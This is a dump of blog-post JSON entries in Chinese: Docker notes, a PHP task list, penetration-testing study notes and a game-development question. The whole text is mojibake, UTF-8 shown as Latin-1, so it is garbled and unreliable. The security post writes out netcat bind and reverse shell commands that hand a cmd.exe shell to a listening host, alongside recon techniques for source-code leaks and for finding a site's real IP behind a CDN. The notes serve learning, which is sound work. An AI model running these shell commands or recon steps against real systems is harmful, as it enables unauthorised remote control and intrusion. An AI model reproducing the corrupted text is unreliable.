dockeræµ‹è¯•sudo docker run hello-world æ™®é€šäººä½¿ç”¨éœ€è¦æŒæ¡çŸ¥è¯†ï¼šdocker-compleä»€ä¹ˆçš„ä»–æ˜¯dockerçš„ä¸€ä»¶å¯åŠ¨å®¹å™¨åŠŸèƒ½ã€‚è¿™ä¸ªè½¯ä»¶å¯ä»¥ä¸€ä»¶è¯å¿«é€Ÿéƒ¨ç½²å®¹å™¨ï¼Œå¹¶ä¸”å‡ºç°é—®é¢˜åå¯ä»¥ç«‹åˆ»ä½¿ç”¨æ­¤è½¯ä»¶ç«‹åˆ»åˆ›å»ºå…¶ä»–å®¹å™¨ã€‚ dockeréœ€è¦å›ºå®šæŒä¹…åŒ–çš„ç›®å½•ã€‚ç”¨æ¥å­˜å‚¨æ•°æ®ã€‚ dockeræ‹‰å»é•œåƒ 1docker pull docker æŸ¥çœ‹å®¹å™¨ 1docker ps docker æŸ¥çœ‹é•œåƒ 1docker image docker åˆ é™¤å®¹å™¨ 1docker rm åå­—æˆ–id dockeråˆ›å»ºè™šæ‹Ÿç½‘ç»œ 1docker network create å…·ä½“å‚æ•°è¯·æŸ¥é˜…æ–‡æ¡£ dockeræ¯ä¸ªå®¹å™¨å†…éƒ¨ç¯å¢ƒéƒ½ä¸åŒï¼Œç‹¬ç«‹éš”ç¦»ã€‚dockeræœ‰å†…éƒ¨ç«¯å£å’Œå¤–éƒ¨ç«¯å£æ˜ å°„è¿™ä¹ˆä¸€è¯´ã€‚dockerååˆ†æ–¹ä¾¿ã€‚æ–‡ä»¶å­˜å‚¨åœ¨å“ªã€‚å³ä½¿æŒ‚äº†é‡å¯æŒ‚åœ¨åŒæ¨ç›®å½•ä¹Ÿèƒ½èµ·æ¥æœåŠ¡ docker ä¸æ˜¯è™šæ‹Ÿæœºã€‚å®Œå…¨ä¸ä¸€æ ·çš„åº•å±‚ï¼Œ é—®é¢˜ï¼Œä»Šå¤©æˆ‘åœ¨ä½¿ç”¨dockerå®‰è£…openwrtæ—¶å‡ºç°è™šæ‹ŸåŒ–çš„ç¯å¢ƒå½±å“åˆ°å®¿ä¸»ï¼Œåå¹´è€å¼€å‘è¡¨ç¤ºè¿™å±äºå¾ˆæ€ªçš„é—®é¢˜ï¼Œ æˆ‘é‡å¯åï¼Œinit&#x3D;&#x2F;bin&#x2F;bashç»•è¿‡systemç›´æ¥å¯åŠ¨bashï¼Œåœæ­¢äº†dockeræœåŠ¡ã€‚å¹¶å…³é—­äº†dockerçš„è‡ªå¯åŠ¨ systemctl stop docker systemctl disable docker ç„¶ådockeræœ‰ä¸ªå‘½ä»¤æ˜¯æŸ¥çœ‹ä»–çš„ç›®å½•ã€‚æˆ‘è¿›å»åˆ æ‰å…¶ä¸­çš„æ–‡ä»¶ã€‚äºæ˜¯å°±ä¸åœ¨è‡ªå¼ƒï¼Œç„¶åé¡ºåˆ©åˆ é™¤å®¹å™¨ã€‚ è¿™ç§dockeræˆ‘åˆšå­¦å°±é‡åˆ°è¿™ä¹ˆæ£˜æ‰‹çš„é—®é¢˜ã€‚å®åœ¨ä¸æƒ³èŠ±æ—¶é—´åœ¨è¿™ä¸Šé¢æ’æŸ¥ã€‚æ‰€ä»¥æˆ‘å†³å®šè§£å†³é—®é¢˜ã€‚è€Œä¸æ˜¯æ’æŸ¥é—®é¢˜ã€‚å¦‚äº†è§£dockerå¯åŠ¨åŸç†ã€‚æ ¸å¿ƒã€‚åº•å±‚åŸç†ã€‚è¿™ä¸æ˜¯æˆ‘çš„æ’æŸ¥èŒƒå›´ï¼Œæˆ‘æƒ³ç€ç ´ådockerçš„æ–‡ä»¶å¯¼è‡´ä»–ä¸èƒ½è‡ªå¯åŠ¨ã€‚åç»­åœ¨è¿›è¡Œåˆ é™¤ï¼Œä¹Ÿèƒ½ä¿å…¨dockerå…¶ä»–çš„ä¸œè¥¿ã€‚1 ç¾¤å‹è¯´ï¼šdebianè™šæ‹ŸåŒ–æ›´æˆç†Ÿã€‚archä¸é€‚åˆåœ¨ç”Ÿäº§ç¯å¢ƒç§è¿è¡Œã€‚ã€ dockeré€ƒé€¸ã€‚æ„Ÿè§‰å¾ˆåƒæˆ‘è¿™ä¸ªé—®é¢˜","categories":[],"tags":[]},{"title":"phpå¼€å‘","slug":"phpå¼€å‘","date":"2023-12-16T19:39:00.000Z","updated":"2023-12-24T17:38:07.422Z","comments":true,"path":"2023/12/17/phpå¼€å‘/","link":"","permalink":"http://example.com/2023/12/17/php%E5%BC%80%E5%8F%91/","excerpt":"ä»»åŠ¡ å®‰è£…ç¯å¢ƒï¼š navicatè¿›è¡Œæ“ä½œæ•°æ®åº“ Dreamweaverï¼šå‰ç«¯é¡µé¢è®¾è®¡ phpstormï¼šphpå¼€å‘ phpstudyï¼šphpæ­å»ºç¯å¢ƒ","text":"ä»»åŠ¡ å®‰è£…ç¯å¢ƒï¼š navicatè¿›è¡Œæ“ä½œæ•°æ®åº“ Dreamweaverï¼šå‰ç«¯é¡µé¢è®¾è®¡ phpstormï¼šphpå¼€å‘ phpstudyï¼šphpæ­å»ºç¯å¢ƒ 2.æ–‡ç« åŠŸèƒ½æ˜¾ç¤º3.æ•°æ®åº“æ“ä½œ4.æ¥æ”¶æ•°æ®5.æ–‡ä»¶æ“ä½œç±»6.ç¼–è¾‘å™¨7.ä¸Šä¼ &#x2F;ä¸‹è½½&#x2F;è¯»å†™&#x2F;åˆ é™¤8.è¾“å…¥è¾“å‡ºç±»9.ç•™è¨€æ¿10.è®¿é—®ip11.uaå¤´12.æ¥æº13.ç™»å½•éªŒè¯14.cookie &amp;session15.éªŒè¯ç å®‰å…¨16.js17.ajax18.å‰ç«¯é€»è¾‘19.è´­ç‰©20.ç™»å½•21.ä¸Šä¼ 22.tpæ¡†æ¶23.è·¯ç”±è®¿é—®24.å®‰å…¨å†™æ³•25.å†å²æ¼æ´ 1.æ–‡ç« åŠŸèƒ½æ˜¾ç¤º","categories":[],"tags":[]},{"title":"webå®‰å…¨day1","slug":"webå®‰å…¨1","date":"2023-12-15T15:47:33.000Z","updated":"2024-01-21T16:44:13.536Z","comments":true,"path":"2023/12/15/webå®‰å…¨1/","link":"","permalink":"http://example.com/2023/12/15/web%E5%AE%89%E5%85%A81/","excerpt":"1.Ncç‘å£«å†›åˆ€ä½¿ç”¨è¯¦è§£1.tcpç›‘å¬123456789101112131415tcpç›‘å¬ncå¯ä»¥ä½œä¸ºserverç«¯å¯åŠ¨ä¸€ä¸ªtcpçš„ç›‘å¬ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸‹é¢ç›‘å¬çš„æ˜¯ä¸€ä¸ªtcpçš„ç«¯å£nc -l -p 9999å®¢æˆ·ç«¯æµ‹è¯•1ã€åœ¨Bæœºå™¨ä¸Štelnet Aæœºå™¨æ­¤ç«¯å£ï¼Œå¦‚ä¸‹æ˜¾ç¤ºè¡¨ç¤ºBæœºå™¨å¯ä»¥è®¿é—®Aæœºå™¨æ­¤ç«¯å£telnet 10.0.1.161 99992ã€Bæœºå™¨ä¸Šä¹Ÿå¯ä»¥ä½¿ç”¨nmapæ‰«æAæœºå™¨çš„æ­¤ç«¯å£nmap 10.0.1.161 -p99993ã€ä½¿ç”¨ncå‘½ä»¤ä½œä¸ºå®¢æˆ·ç«¯å·¥å…·è¿›è¡Œç«¯å£æ¢æµ‹nc -vz -w 2 10.0.1.161 9999ï¼ˆ-vå¯è§†åŒ–ï¼Œ-zæ‰«ææ—¶ä¸å‘é€æ•°æ®ï¼Œ-wè¶…æ—¶å‡ ç§’ï¼Œåé¢è·Ÿæ•°å­—ï¼‰æœåŠ¡ç«¯ä¼šè‡ªåŠ¨å…³é—­ç›‘å¬ã€‚4ã€ncå¯ä»¥æ‰«æè¿ç»­ç«¯å£ï¼Œè¿™ä¸ªä½œç”¨éå¸¸é‡è¦ã€‚å¸¸å¸¸å¯ä»¥ç”¨æ¥æ‰«ææœåŠ¡å™¨ç«¯å£ï¼Œç„¶åç»™æœåŠ¡å™¨å®‰å…¨åŠ å›ºåœ¨å®¢æˆ·ç«¯Bæœºå™¨ä¸Šæ‰«æè¿ç»­çš„ä¸¤ä¸ªç«¯å£ï¼Œå¦‚ä¸‹nc -vzw 2 10.0.1.161 9998-9999","text":"1.Ncç‘å£«å†›åˆ€ä½¿ç”¨è¯¦è§£1.tcpç›‘å¬123456789101112131415tcpç›‘å¬ncå¯ä»¥ä½œä¸ºserverç«¯å¯åŠ¨ä¸€ä¸ªtcpçš„ç›‘å¬ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸‹é¢ç›‘å¬çš„æ˜¯ä¸€ä¸ªtcpçš„ç«¯å£nc -l -p 9999å®¢æˆ·ç«¯æµ‹è¯•1ã€åœ¨Bæœºå™¨ä¸Štelnet Aæœºå™¨æ­¤ç«¯å£ï¼Œå¦‚ä¸‹æ˜¾ç¤ºè¡¨ç¤ºBæœºå™¨å¯ä»¥è®¿é—®Aæœºå™¨æ­¤ç«¯å£telnet 10.0.1.161 99992ã€Bæœºå™¨ä¸Šä¹Ÿå¯ä»¥ä½¿ç”¨nmapæ‰«æAæœºå™¨çš„æ­¤ç«¯å£nmap 10.0.1.161 -p99993ã€ä½¿ç”¨ncå‘½ä»¤ä½œä¸ºå®¢æˆ·ç«¯å·¥å…·è¿›è¡Œç«¯å£æ¢æµ‹nc -vz -w 2 10.0.1.161 9999ï¼ˆ-vå¯è§†åŒ–ï¼Œ-zæ‰«ææ—¶ä¸å‘é€æ•°æ®ï¼Œ-wè¶…æ—¶å‡ ç§’ï¼Œåé¢è·Ÿæ•°å­—ï¼‰æœåŠ¡ç«¯ä¼šè‡ªåŠ¨å…³é—­ç›‘å¬ã€‚4ã€ncå¯ä»¥æ‰«æè¿ç»­ç«¯å£ï¼Œè¿™ä¸ªä½œç”¨éå¸¸é‡è¦ã€‚å¸¸å¸¸å¯ä»¥ç”¨æ¥æ‰«ææœåŠ¡å™¨ç«¯å£ï¼Œç„¶åç»™æœåŠ¡å™¨å®‰å…¨åŠ å›ºåœ¨å®¢æˆ·ç«¯Bæœºå™¨ä¸Šæ‰«æè¿ç»­çš„ä¸¤ä¸ªç«¯å£ï¼Œå¦‚ä¸‹nc -vzw 2 10.0.1.161 9998-9999 2.ä¼ æ–‡ä»¶123456789101112131415161718æ–¹æ³•1ï¼Œå…ˆå¯åŠ¨æ¥æ”¶å‘½ä»¤ä½¿ç”¨ncä¼ è¾“æ–‡ä»¶è¿˜æ˜¯æ¯”è¾ƒæ–¹ä¾¿çš„ï¼Œå› ä¸ºä¸ç”¨scpå’Œrsyncé‚£ç§è¾“å…¥å¯†ç çš„æ“ä½œäº†æŠŠAæœºå™¨ä¸Šçš„ä¸€ä¸ªrpmæ–‡ä»¶å‘é€åˆ°Bæœºå™¨ä¸Šéœ€æ³¨æ„æ“ä½œæ¬¡åºï¼Œreceiverå…ˆä¾¦å¬ç«¯å£ï¼Œsenderå‘receiveræ‰€åœ¨æœºå™¨çš„è¯¥ç«¯å£å‘é€æ•°æ®ã€‚ æ­¥éª¤1ï¼Œå…ˆåœ¨Bæœºå™¨ä¸Šå¯åŠ¨ä¸€ä¸ªæ¥æ”¶æ–‡ä»¶çš„ç›‘å¬ï¼Œæ ¼å¼å¦‚ä¸‹æ„æ€æ˜¯æŠŠèµ–åœ¨9995ç«¯å£æ¥æ”¶åˆ°çš„æ•°æ®éƒ½å†™åˆ°fileæ–‡ä»¶é‡Œï¼ˆè¿™é‡Œæ–‡ä»¶åéšæ„å–ï¼‰æ ¼å¼ï¼šnc -l port &gt;filenc -l -p 9995 &gt;zabbix.rpmæ­¥éª¤2ï¼Œåœ¨Aæœºå™¨ä¸Šå¾€Bæœºå™¨çš„9995ç«¯å£å‘é€æ•°æ®ï¼ŒæŠŠä¸‹é¢rpmåŒ…å‘é€è¿‡å»nc 10.0.1.162 9995 &lt; zabbix-release-2.4-1.el6.noarch.rpmæ–¹æ³•2ï¼Œå…ˆå¯åŠ¨å‘é€å‘½ä»¤æ­¥éª¤1ï¼Œå…ˆåœ¨Bæœºå™¨ä¸Šï¼Œå¯åŠ¨å‘é€æ–‡ä»¶å‘½ä»¤ä¸‹é¢å‘½ä»¤è¡¨ç¤ºé€šè¿‡æœ¬åœ°çš„9992ç«¯å£å‘é€test.mvæ–‡ä»¶nc -l -p 9992 &lt;test.mvæ­¥éª¤2ï¼ŒAæœºå™¨ä¸Šè¿æ¥Bæœºå™¨ï¼Œå–æ¥æ”¶æ–‡ä»¶ä¸‹é¢å‘½ä»¤è¡¨ç¤ºé€šè¿‡è¿æ¥Bæœºå™¨çš„9992ç«¯å£æ¥æ”¶æ–‡ä»¶ï¼Œå¹¶æŠŠæ–‡ä»¶å­˜åˆ°æœ¬ç›®å½•ä¸‹ï¼Œæ–‡ä»¶åä¸ºtest2.mvnc 10.0.1.162 9992 &gt;test2.mv 3.ncåå¼¹shell123456789101112131415161718æ–¹æ³•1ã€REMOTEä¸»æœºç»‘å®šSHELLåœ¨å…¬ç½‘ç›‘å¬nc -l -p 5354 -t -e c:\\winnt\\system32\\cmd.exeæˆ–è€…nc -l -p 5555 -t -e cmd.exeåœ¨å†…ç½‘ä¸»åŠ¨å»ºç«‹è¿æ¥nc -nvv 192.168.153.138 5555-tæ˜¯é€šè¿‡telneæ¨¡å¼æ‰§è¡Œ cmd.exe ç¨‹åºï¼Œå¯ä»¥çœç•¥ã€‚è®²è§£ï¼šç»‘å®šREMOTEä¸»æœºçš„CMDSHELLåœ¨REMOTEä¸»æœºçš„TCP5354ç«¯å£æ–¹æ³•2ã€REMOTEä¸»æœºç»‘å®šSHELLå¹¶åå‘è¿æ¥åœ¨å…¬ç½‘ç›‘å¬nc -lp 5555åœ¨å†…ç½‘æœºå™¨åå¼¹nc -t -e c:\\winnt\\system32\\cmd.exe 192.168.x.x 5354æˆ–è€…nc -t -e cmd 192.168.153.140 5555è®²è§£ï¼šç»‘å®šREMOTEä¸»æœºçš„CMDSHELLå¹¶åå‘è¿æ¥åˆ°192.168.x.xçš„TCP5354ç«¯å£ 2.åŠ è§£å¯†12345678910111213md5 16ä½å’Œ32ä½ 0-9 å’Œa-f ç»„æˆçš„å­—ç¬¦ä¸² è§£å¯†ï¼š 1.çŸ¥é“ç®—æ³• 2.ç¢°æ’æšä¸¾ç”Ÿæˆå¯†æ–‡ æœ‰ç‰¹æ®Šæƒ…å†µã€‚md5ä¼šåŠ saltä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ discuz 12SHA1å’Œmd5ç‰¹å¾å·®ä¸å¤šï¼Œåªæ˜¯ä½æ•°æ˜¯40 1234NTLMWINDOWSç³»ç»Ÿå“ˆå¸Œå¯†ç ï¼Œæ ‡å‡†é€šè®¯å®‰å…¨åè®®win7ä¹‹åä½¿ç”¨çš„å¯†ç ä¹‹å‰æ˜¯LM 12aesï¼Œdesï¼Œrc4éƒ½æ˜¯éå¯¹ç§°åŠ å¯†ã€‚å°åº¦å¯†é’¥ï¼Œå¯†æ–‡ç‰¹è´¨ä¸base64ç±»ä¼¼ å¤§å°å†™æ•æ„Ÿ 1base64 é€šå¸¸ä»¥=ç»“å°¾ã€1-9 a-f 1url é€šå¸¸ä»¥=ç»“å°¾ã€1-9 a-f é€šå¸¸ä»¥%æ•°å­—å­—æ¯åˆ†å‰² 1234ç¼–ç gbkï¼Œutf-8 é¢œæ–‡å­—åŠ å¯†ï¼šaaencode12jotherï¼š +()[]&#123;&#125;jsfuckæ˜¯å’Œjotherå¾ˆåƒã€‚å°‘äº†&#123;&#125; å›¾ç‰‡é‡ŒåŒ…å«æ–‡ä»¶çš„æŠ€æœ¯3.åˆ¤æ–­æ“ä½œç³»ç»Ÿttl123456WINDOWS NT/2000 TTLï¼š128WINDOWS 95/98 TTLï¼š32UNIX TTLï¼š255LINUX TTLï¼š64WIN7 TTLï¼š64 nmapä½¿ç”¨æŠ€æœ¯å¯ä»¥å…·ä½“äº†è§£åˆ¤å®šæ–¹æ³• 4.æ•°æ®åº“åˆ¤å®šâ€‹ ç«¯å£æ‰«æ 1234567mysql 3306oracle 1521sql server 1433db2 5000 5.ä¸»åŠ¨æ‰“ç‚¹å’Œè¢«åŠ¨æ‰“ç‚¹12ä¸»åŠ¨å¼ä¿¡æ¯æ‰“ç‚¹ï¼šä¸»åŠ¨ä½¿ç”¨å·¥å…·ã€ä¸»åŠ¨å‘èµ·æµ‹è¯•æµé‡ç­‰è¢«åŠ¨å¼ä¿¡æ¯æ‰“ç‚¹ï¼šè°ƒç”¨æ¥å£è·å–ä¿¡æ¯ç­‰ 6.æ”¶é›† æ“ä½œç³»ç»Ÿ è„šæœ¬è¯­è¨€ æ•°æ®åº“ æºç åç§° 7.æ³„éœ²åŸç ï¼ˆcmsæ‰¾ä¸åˆ°çš„æƒ…å†µï¼‰gitå’Œsvn1234githackåŸç† .gitsvnhackåŸç† .svn ç›®å½•å¤‡ä»½1ç›®å½•æ‰«æç§’äº† DsStore12macçš„ä¸Šä¼ è½¯ä»¶ds_store PHPæºç æ³„éœ²123456javaæœ‰mavennode.jsæœ‰npmphpæœ‰composer composer.jsoné…ç½®æ–‡ä»¶ é‡Œé¢æœ‰é…ç½®ä¿¡æ¯ã€‚æ’ä»¶ã€‚ä¸­é—´ä»¶ä¿¡æ¯ WEB-INF&#x2F;web.xml1web-inf æ˜¯javaçš„webåº”ç”¨å®‰å…¨ç›®å½•ï¼Œè¦æ˜¯æƒ³è®¿é—®æ–‡ä»¶ã€‚å¿…é¡»åœ¨web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œæ˜ å°„ 8.ä¿¡æ¯æ”¶é›†githubçš„readmeé‚®ç®±ï¼Œç‰ˆæƒå£°æ˜ã€‚åŸŸåå¸¸ç”¨æœç´¢ã€‚ 9ã€‚ç«¯å£æ‰«æ ç½‘ç»œæ¶æ„ã€‚ å†…ç½‘èµ„äº§ï¼Œå†…ç½‘åè®® é˜»ç¢ä¿¡æ¯ï¼Œcdnï¼Œwafã€‚è´Ÿè½½ï¼Œé˜²ç«å¢™ã€‚ ç«¯å£ï¼ˆ1-65535ï¼‰ 12nmap åè®®ã€‚ç«¯å£æ‰«æã€‚é˜²ç«å¢™è¯†åˆ«masscan åè®®ï¼Œç«¯å£æ‰«æã€ 10.ç«¯å£æ¸—é€11.cæ®µ&#x2F;æ—æ³¨æ—æ³¨1234171.40.78.44www.123.comwww.44.comwww.54454.com cæ®µ12ç„¶åç”¨ipåæŸ¥æŸ¥çœ‹ç»‘å®šåŸŸåã€‚å¯ä»¥è¿›å»çœ‹çœ‹èµ„äº§åŒç½‘æ®µæ¸—é€ cdnåˆ¤æ–­1è¶…çº§pingã€‚å…¨å›½å„åœ°pingä¸€ä¸‹ç§’äº† wafåˆ¤æ–­https://www.wangan.com/p/11v71302b8c5ab87 12å·¥å…· wafw00f è´Ÿè½½å‡è¡¡12å·¥å…·ï¼š lbd cdnç»•è¿‡12345678910111213141516171.å­åŸŸåæŸ¥è¯¢ã€‚æœ‰äº›å­åŸŸåæ²¡æœ‰åŠ é€Ÿcdnæ¯”å¦‚ä½ ç›´æ¥è®¿é—® www.baidu.comä»–å¦‚æœæ²¡ä¹°*.baidu.comé‚£ä¹ˆè®¿é—®test.baidu.com baidu.coméƒ½ä¼šæš´éœ²çœŸå®ip æ³¨æ„ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼å½“ç„¶è¿™å»ºç«‹åœ¨ä¸»åŸŸåå’Œå­åŸŸååŒä¸ªæœåŠ¡å™¨ã€‚æœ‰äº›åŠæ¯›ä¸è¿™æ ·åš2.åˆ©ç”¨ç½‘ç«™æ¼æ´æš´éœ²çœŸå®ip3.å†å²dnsè®°å½•4.MX5.å›½å¤–è¯·æ±‚(ä»…é™ä¸­å›½å¤§é™†ç­–ç•¥ä¸‹) å…¨çƒcdnæŸ¥è¯¢:tools.ipip.net æ‰¾å†·ä»¬cdnã€‚ä»–ä¸€å®šä¸ä¼šéƒ¨ç½²cdn6.zmap7.ç½‘ç»œç©ºé—´æœç´¢å¼•æ“ï¼š zoomeyeã€‚fofaã€shodan8.éƒ¨åˆ†åŠ é€Ÿçš„å°±å¯ä»¥çœ‹ç½‘ç»œè¯·æ±‚åŒ… 12æ¼æ´&amp;é—ç•™æ–‡ä»¶ åƒæ˜¯æœ‰äº›é…ç½®æ–‡ä»¶ã€‚æ¯”å¦‚phpInfo.phpé‡Œé¢å°±ä¼šé…ç½®ipåœ°å€.ä»è€Œå¾—çŸ¥çœŸå®ipï¼Œé€‚ç”¨äºæ²¡æœ‰å†…ç½‘ç½‘å¡ã€‚ 12345678910111213141516171819202122231.ä¼ ç»Ÿè®¿é—®ï¼šè®¿é—®åŸŸå-&gt;dns-&gt;ç›®æ ‡ä¸»æœº2.cdnç‘å…‹æ´¾ï¼šè®¿é—®åŸŸå-&gt;cdn-&gt;3.è®¿é—®åŸŸå-&gt;-&gt;4. ä¸»åŠ¨é‚®ä»¶é…åˆå¤‡æ¡ˆ è®©å¯¹æ–¹æœåŠ¡å™¨ä¸»åŠ¨å‘é‚®ä»¶ç»™ä½ ï¼ˆæ³¨å†Œã€æ‰¾å›å¯†ç ç­‰åŠŸèƒ½ï¼‰5.æŠ“APPåŒ…: æœ‰æ—¶å€™ç½‘ç«™ä½¿ç”¨äº†CDNï¼Œä½†æ˜¯å¯èƒ½å…¶APPæ²¡æœ‰ä½¿ç”¨ï¼Œé‚£ä¹ˆé€šè¿‡æŠ“å–APPçš„æ•°æ®åŒ…æœ‰å¯èƒ½å¾—å‡ºçœŸå®çš„IPåœ°å€6.å›½å¤–ç¬¬ä¸‰æ–¹æµ‹è¯•CDNç½‘ç«™ï¼ˆç»“åˆäº†å‡ ç§æ–¹æ³•äºä¸€èº«ï¼‰ https://get-site-ip.com/7.æŸ¥çœ‹å†å²è§£æIP https://site.ip138.com/ https://viewdns.info/8.å…¨ç½‘æ‰«æFuckCDN(æ²¡æœ‰åŠæ³•çš„åŠæ³•) å‚å•†æŸ¥è¯¢ï¼š https://tools.ipip.net/cdn.php IPåº“ç­›åœ°å€æ®µ https://www.cz88.net/geo-public //IPåº“èµ„æº,è¦ä¸‹è½½å®¢æˆ·ç«¯ å…¨ç½‘æ‰«æï¼š https://github.com/Tai7sy/fuckcdn9.ssrfæ¼æ´ æƒ³åŠæ³•è®©å¯¹æ–¹ä¸»æœºè®¿é—®ä½ ï¼Œä½ è‡ªå·±å¼„ä¸ªwebæœåŠ¡ï¼Œç›‘å¬ä¸ªç«¯å£ï¼Œè®°å½•æ—¥å¿—ã€‚ ç„¶åé€šè¿‡æ¼æ´Â·è®©å¯¹æ–¹è®¿é—®ä½ ï¼Œäºæ˜¯å°±å¾—åˆ°ip&#x27;äº† ç‰›é€¼çš„å·¥å…·â€‹ get-site-ip.com æ‰¾åˆ°cdnåå’‹åŠï¼Ÿ12ç»‘å®šhostæ–‡ä»¶ç›´æ¥æŒ‡å‘çœŸå®ipåæœŸæµ‹è¯•æµ‹å¯¹åœ°æ–¹ æ­£å‘è¿æ¥å’Œåå‘è¿æ¥æ­£å‘è¿æ¥â€‹ 1æ­£å‘è¿æ¥æ˜¯å—å®³ä¸»æœºç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œç”±æ§åˆ¶ä¸»æœºä¸»åŠ¨å»è¿æ¥å—å®³ä¸»æœºçš„è¿‡ç¨‹ï¼Œé€‚ç”¨äºå—å®³ä¸»æœºå…·æœ‰[å…¬ç½‘ip](https://so.csdn.net/so/search?q=å…¬ç½‘ip&amp;spm=1001.2101.3001.7020)çš„æƒ…å†µä¸‹ã€‚ä¾‹å¦‚ä¸‹é¢ï¼Œå—å®³ä¸»æœºå…·æœ‰å…¬ç½‘ipï¼Œè¢«æ§ä¸»æœºkaliå¯ä»¥é€šè¿‡ipåœ°å€è®¿é—®åˆ°å—å®³ä¸»æœºï¼Œæ‰€ä»¥èƒ½å¤Ÿä½¿ç”¨æ­£ç›¸è¿æ¥æ¥æ§åˆ¶å—å®³ä¸»æœºã€‚ åå‘è¿æ¥123åå‘è¿æ¥æ˜¯æ§åˆ¶ä¸»æœºç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œç”±å—å®³ä¸»æœºåå‘å»è¿æ¥æ§åˆ¶ä¸»æœºçš„è¿‡ç¨‹ï¼Œé€‚ç”¨äºå—å®³ä¸»æœºå‡ºç½‘ï¼ˆæˆ–å‡ºç½‘ä¸”æ²¡æœ‰å…¬ç½‘ipï¼‰çš„æƒ…å†µã€‚ä¾‹å¦‚ï¼Œå—å®³ä¸»æœºæ˜¯ä¸€å°ä½äºå†…ç½‘ï¼Œå¹¶ä¸”æ²¡æœ‰å…¬ç½‘ipä¸”èƒ½è®¿é—®äº’è”ç½‘çš„ä¸»æœºï¼Œæ§åˆ¶ä¸»æœºæ— æ³•ç›´æ¥é€šè¿‡ipåœ°å€è®¿é—®åˆ°å—å®³ä¸»æœºã€‚æ‰€ä»¥æ­¤æ—¶éœ€è¦åœ¨æ§åˆ¶ä¸»æœºä¸Šç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œè®©å—å®³æœºä¸»åŠ¨è¿æ¥æ§åˆ¶ä¸»æœºï¼Œä»è€Œå®ç°å¯¹æ§åˆ¶ä¸»æœºçš„æ§åˆ¶ã€‚ç”±äºæ­£å‘è¿æ¥æ˜¯è¢«æ”»å‡»è€…ä¸»åŠ¨è¿æ¥æ”»å‡»è€…ï¼Œæ‰€ä»¥ä¸å—é˜²ç«å¢™ç­–ç•¥çš„é™åˆ¶ é€†å‘æ–¹å‘ä»£ç åˆ†æ&amp;æŠ“åŒ…åˆ†æ app&amp;&amp;å°ç¨‹åº æ”¶é›†appé‡Œçš„æ‰€æœ‰åœ°å€ï¼Œæ”¶é›†æ‰€æœ‰è¯·æ±‚ã€‚api ossé˜¿é‡Œäº‘çš„æœåŠ¡ï¼Œä»–åˆä»–çš„å®¢æˆ·ç«¯ã€‚å­˜å‚¨èµ„æº æŠ“åŒ…å°åŒ… é€†å‘äºŒè¿›åˆ¶ åæ¡†æ¶æ£€æµ‹ å·¥å…· å†…åœ¨æœç´¢ï¼šappinfoScannerè‡ªåŠ¨åç¼–è¯‘1ç§»åŠ¨ç«¯ï¼Œiosï¼Œwebï¼Œhsã€‚é™æ€ç½‘ç«™ä¿¡æ¯æ”¶é›†å·¥å…·ã€‚åŸºæœ¬ä¿¡æ¯æ”¶é›†ï¼Œtitleã€‚dormainã€‚cdnã€‚æŒ‡çº¹ä¿¡æ¯ã€‚çŠ¶æ€ä¿¡æ¯ï¼Œå†…åœ¨æå–ã€‚åç¼–è¯‘æ”¶é›† ideaæ‰‹åŠ¨åç¼–è¯‘å†…åœ¨æœç´¢å®‰å“ä¿®æ”¹å¤§å¸ˆ1å¯ä»¥è¿æ¥çœŸæœºå»æŠ“åŒ…","categories":[],"tags":[]},{"title":"linuxè¿ç»´æŠ€æœ¯","slug":"linuxè¿ç»´æŠ€æœ¯","date":"2023-12-11T12:50:45.000Z","updated":"2023-12-11T12:50:45.380Z","comments":true,"path":"2023/12/11/linuxè¿ç»´æŠ€æœ¯/","link":"","permalink":"http://example.com/2023/12/11/linux%E8%BF%90%E7%BB%B4%E6%8A%80%E6%9C%AF/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"è®ºæ¸¸æˆå¼€å‘ä»ä»£ç åˆ°å›¾åƒäº’åŠ¨","slug":"è®ºæ¸¸æˆå¼€å‘ä»ä»£ç åˆ°å›¾åƒäº’åŠ¨","date":"2023-12-05T00:36:17.000Z","updated":"2023-12-24T17:38:37.504Z","comments":true,"path":"2023/12/05/è®ºæ¸¸æˆå¼€å‘ä»ä»£ç åˆ°å›¾åƒäº’åŠ¨/","link":"","permalink":"http://example.com/2023/12/05/%E8%AE%BA%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%88%B0%E5%9B%BE%E5%83%8F%E4%BA%92%E5%8A%A8/","excerpt":"åªåœ¨å¤§å­¦å­¦äº†ç‚¹cçš®æ¯›çš„é—¨å¤–æ±‰æƒ³é—®ä¸€ä¸‹è¿™äº›c++ä»£ç æ˜¯æ€ä¹ˆå’Œé‚£äº›å›¾å½¢ç•Œé¢è”ç³»èµ·æ¥çš„ï¼Œä¸€ç›´æ— æ³•ç†è§£å‘½ä»¤è¡Œæ˜¯æ€ä¹ˆåˆ°æ¸¸æˆç”»é¢çš„?","text":"åªåœ¨å¤§å­¦å­¦äº†ç‚¹cçš®æ¯›çš„é—¨å¤–æ±‰æƒ³é—®ä¸€ä¸‹è¿™äº›c++ä»£ç æ˜¯æ€ä¹ˆå’Œé‚£äº›å›¾å½¢ç•Œé¢è”ç³»èµ·æ¥çš„ï¼Œä¸€ç›´æ— æ³•ç†è§£å‘½ä»¤è¡Œæ˜¯æ€ä¹ˆåˆ°æ¸¸æˆç”»é¢çš„? 1234567891011121314151617ä½ å¥½ï¼Œæˆ‘ä¹‹å‰å­¦è¿‡ä¸€äº›æ¸¸æˆå¼€å‘ï¼Œæˆ‘å°½é‡é€šä¿—åœ°è§£ç­”ä½ çš„ç–‘é—®çœŸå®å¼€å‘æ¸¸æˆæ—¶ï¼Œæˆ‘ä»¬æ—¢ä¸ä¼šç”¨éå¸¸åŸå§‹çš„è°ƒç”¨å›¾å½¢APIæ¥å‡ ä¹ä»é›¶å¼€å§‹åšæ¸¸æˆï¼Œä¹Ÿä¸ä¼šåªç”¨æ¸¸æˆå¼•æ“æä¾›çš„æ’ä»¶ç‚¹ç‚¹é¼ æ ‡è€Œä¸å†™ä¸€è¡Œä»£ç 